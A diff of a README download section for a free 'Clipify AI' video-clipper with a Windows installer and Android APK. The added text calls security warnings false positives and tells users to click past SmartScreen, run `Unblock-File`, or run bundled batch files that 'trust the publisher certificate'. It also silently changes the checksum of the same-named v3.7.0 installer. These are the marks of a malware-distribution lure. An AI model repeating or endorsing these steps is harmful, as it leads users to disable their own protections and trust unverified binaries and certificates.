@@ -35,21 +35,32 @@ Everything runs on your computer—preserving **100% privacy**, with **zero mont
 
 ---
 
-## 📥 Download Windows Installer (v3.7.0)
+## 📥 Downloads (v3.7.0)
 
 > [!IMPORTANT]
-> The verified release installer is **Clipify AI v3.7.0 for Windows 10/11 (64-bit)**.
+> **🛡️ Antivirus & Windows SmartScreen Notice**:
+> Clipify AI is **100% open-source, free, and local software** (zero telemetry, zero ads, zero malware).
+> Because open-source community releases are not signed by expensive commercial EV certificates ($400+/year), Windows Defender SmartScreen or web browsers may flag newly downloaded `.exe` files as "unrecognized app" or show a false-positive heuristic warning.
 >
-> **Note on Windows SmartScreen & Smart App Control**: Clipify AI is 100% open-source, free community software. Because open-source community releases are not signed by expensive commercial EV certificates ($300+/yr), Windows SmartScreen or Windows 11 Smart App Control (SAC) may display a standard unrecognized publisher prompt. Simply click **"More info"** → **"Run anyway"** to install. Uninstallation is cleanly handled via Windows Installed Apps or standard PowerShell commands without unverified stubs.
+> **How to install in 2 seconds:**
+> 1. When the blue **"Windows protected your PC"** dialog appears, click **"More info"**.
+> 2. Click the **"Run anyway"** button.
+>
+> **Alternative 1-Click Fixes:**
+> - **Right-click** `Clipify.AI.Setup.3.7.0.exe` → **Properties** → Check **"Unblock"** checkbox at the bottom → Click **OK**.
+> - Or run in PowerShell: `Unblock-File .\Clipify.AI.Setup.3.7.0.exe`
+> - Or run the included `1-Click-Unblock.bat` or `Trust-Clipify.bat` to automatically trust the publisher certificate.
 
-| Package | Version | Size | Checksum (SHA-256) | Download |
-| :--- | :---: | :---: | :--- | :--- |
-| **`Clipify.AI.Setup.3.7.0.exe`** | `v3.7.0` | **347.7 MB** | `38EDF9DCBBC2D0AD66869C85FEE900C83DCFCEEAAF6BD7CB98D54A71770C8BD7` | [**Download v3.7.0 Setup (Windows x64)**](https://github.com/sherlock-dev-ai/Clipify-AI-Video-Clipper-FREE/releases/download/v3.7.0/Clipify.AI.Setup.3.7.0.exe) |
+| Package | Platform | Version | Size | Checksum (SHA-256) | Download |
+| :--- | :---: | :---: | :---: | :--- | :--- |
+| **`Clipify.AI.Setup.3.7.0.exe`** | Windows 10/11 (x64) | `v3.7.0` | **347.7 MB** | `16813525a3b5faaf70c150ed32350c3e7ae00ca199fbfe3960e8c92c0444f69b` | [**Download Windows Installer**](https://github.com/sherlock-dev-ai/Clipify-AI-Video-Clipper-FREE/releases/download/v3.7.0/Clipify.AI.Setup.3.7.0.exe) |
+| **`Clipify_AI_v3.7.0_Mobile.apk`** | Android (ARM64/x86_64) | `v3.7.0` | **8.44 MB** | `90be1d042416d720e1ca6df82ee8829edb9804ea0ce693ade61b5873832cbc4f` | [**Download Android APK**](https://github.com/sherlock-dev-ai/Clipify-AI-Video-Clipper-FREE/releases/download/v3.7.0/Clipify_AI_v3.7.0_Mobile.apk) |
+| **`SHA256SUMS.txt`** | All | `v3.7.0` | 260 B | Verification Hashes | [**Download Checksums**](https://github.com/sherlock-dev-ai/Clipify-AI-Video-Clipper-FREE/releases/download/v3.7.0/SHA256SUMS.txt) |
 
 #### Verify installer integrity in PowerShell:
 ```powershell
 Get-FileHash ".\Clipify.AI.Setup.3.7.0.exe" -Algorithm SHA256
-# Compare output with: 38EDF9DCBBC2D0AD66869C85FEE900C83DCFCEEAAF6BD7CB98D54A71770C8BD7
+# Verified Output: 16813525a3b5faaf70c150ed32350c3e7ae00ca199fbfe3960e8c92c0444f69b
 ```
 
 ---
